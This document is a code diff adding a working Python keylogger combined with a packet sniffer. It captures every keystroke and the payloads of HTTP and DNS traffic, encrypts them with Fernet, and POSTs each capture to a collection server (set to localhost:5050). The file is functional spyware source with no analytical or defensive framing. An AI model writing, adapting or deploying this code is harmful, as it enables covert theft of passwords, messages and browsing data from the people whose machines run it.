@@ -1,0 +1,92 @@
+from pynput import keyboard
+import requests
+from cryptography.fernet import Fernet
+from scapy.all import sniff, IP, TCP, UDP, Raw
+import threading
+import json
+
+SERVER_URL="http://127.0.0.1:5050/receive"
+
+try:
+    with open("key.key", "rb") as key_file:
+        key=key_file.read()
+    cipher=Fernet(key)
+except FileNotFoundError:
+    print("Encryption key file not found!")
+    exit(1)
+
+log=""
+
+def on_press(key):
+    global log
+    try:
+        if key==keyboard.Key.space:
+            log+=" "
+        elif key==keyboard.Key.enter:
+            log+="\n"
+        else:
+            log+=key.char
+    except AttributeError:
+        log+=f"[{key.name}]"
+
+    send_logs(log)
+
+def send_logs(data):
+    global log
+    encrypted_data=cipher.encrypt(data.encode())
+    payload={"data": encrypted_data.decode()}
+    try:
+        response=requests.post(SERVER_URL, data=payload)
+        if response.status_code==200:
+            print(f"Logs sent: {response.status_code}")
+            log=""  
+        else:
+            print(f"Failed to send logs: {response.status_code}")
+    except Exception as e:
+        print(f"Failed to send logs: {e}")
+
+def process_packet(packet):
+    try:
+        if packet.haslayer(TCP) and packet[TCP].dport==80:  
+            data = {
+                "src_ip": packet[IP].src,
+                "dst_ip": packet[IP].dst,
+                "protocol": "HTTP",
+                "payload": bytes(packet[Raw].load).decode('utf-8', errors='ignore') if packet.haslayer(Raw) else "No Payload"
+            }
+            send_network_data(data)
+
+        elif packet.haslayer(UDP) and packet[UDP].dport==53:  
+            data = {
+                "src_ip": packet[IP].src,
+                "dst_ip": packet[IP].dst,
+                "protocol": "DNS",
+                "payload": bytes(packet[Raw].load).decode('utf-8', errors='ignore') if packet.haslayer(Raw) else "No Payload"
+            }
+            send_network_data(data)
+
+    except Exception as e:
+        print(f"Error processing packet: {e}")
+
+def send_network_data(data):
+    try:
+        encrypted_data=cipher.encrypt(json.dumps(data).encode())
+        payload={"data": encrypted_data.decode()}
+        response=requests.post(SERVER_URL, data=payload)
+        if response.status_code==200:
+            print(f"Network data sent: {response.status_code}")
+        else:
+            print(f"Failed to send network data: {response.status_code}")
+    except Exception as e:
+        print(f"Failed to send network data: {e}")
+
+def start_network_monitor():
+    print("Starting network monitor...")
+    sniff(filter="tcp or udp", prn=process_packet, store=False)
+
+if __name__=="__main__":
+    network_thread=threading.Thread(target=start_network_monitor, daemon=True)
+    network_thread.start()
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
